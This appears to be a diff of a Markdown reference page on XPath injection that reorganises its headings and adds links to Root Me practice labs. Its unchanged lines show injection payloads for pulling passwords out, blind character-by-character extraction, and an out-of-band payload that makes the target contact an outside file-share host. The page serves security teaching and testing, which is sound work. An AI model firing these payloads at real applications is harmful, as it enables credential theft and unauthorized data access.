@@ -2,12 +2,14 @@
 
 > XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.
 
+
 ## Summary
 
 * [Tools](#tools)
-* [Exploitation](#exploitation)
-* [Blind exploitation](#blind-exploitation)
-* [Out Of Band Exploitation](#out-of-band-exploitation)
+* [Methodology](#methodology)
+    * [Blind exploitation](#blind-exploitation)
+    * [Out Of Band Exploitation](#out-of-band-exploitation)
+* [Labs](#labs)
 * [References](#references)
 
 ## Tools
@@ -19,7 +21,7 @@
 - [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool
 
 
-## Exploitation
+## Methodology
 
 Similar to SQL : `"string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"`
 
@@ -42,7 +44,7 @@ search=Har') and contains(../password,'c
 search=Har') and starts-with(../password,'c
 ```
 
-## Blind Exploitation
+### Blind Exploitation
 
 1. Size of a string
     ```sql
@@ -54,11 +56,19 @@ search=Har') and starts-with(../password,'c
     substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
     ```
 
-## Out Of Band Exploitation
+### Out Of Band Exploitation
 
 ```powershell
 http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
 ```
+
+
+## Labs
+
+* [Root Me - XPath injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
+* [Root Me - XPath injection - String](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
+* [Root Me - XPath injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)
+
 
 ## References
 
